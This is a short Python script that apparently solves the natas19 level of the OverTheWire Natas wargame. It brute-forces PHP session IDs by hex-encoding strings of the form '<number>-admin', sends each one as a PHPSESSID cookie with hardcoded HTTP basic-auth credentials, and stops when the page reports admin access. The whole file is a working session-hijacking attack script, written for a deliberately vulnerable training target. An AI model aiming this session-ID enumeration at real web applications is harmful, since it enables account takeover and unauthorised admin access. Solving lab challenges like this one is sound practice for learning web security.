

import requests
import re
import codecs

hex = codecs.getencoder('hex')


username = "natas19"
password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"

url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()


for session_id in range(700):
    
    id = hex(b'%d-admin' %session_id)[0].decode("utf-8")
    
    response = session.get(url,cookies={"PHPSESSID":id},auth=(username,password))

    content = response.text
    
    if("You are an admin" in content):
        print("got it:",session_id)
        print(content)
    else:
        print("retry:",session_id)
